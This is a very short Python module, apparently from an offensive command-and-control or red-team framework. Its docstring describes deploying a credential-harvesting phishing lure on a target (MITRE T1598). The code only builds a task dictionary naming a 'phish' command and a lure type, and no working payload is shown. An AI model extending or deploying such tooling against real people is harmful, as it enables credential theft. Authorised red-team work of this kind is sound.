"""
Server-side phish module — deploys credential harvesting lure on target.
T1598: Phishing for Information
"""
from __future__ import annotations


def build_task(lure_type: str = "login") -> dict:
    return {"cmd": "phish", "lure": lure_type}
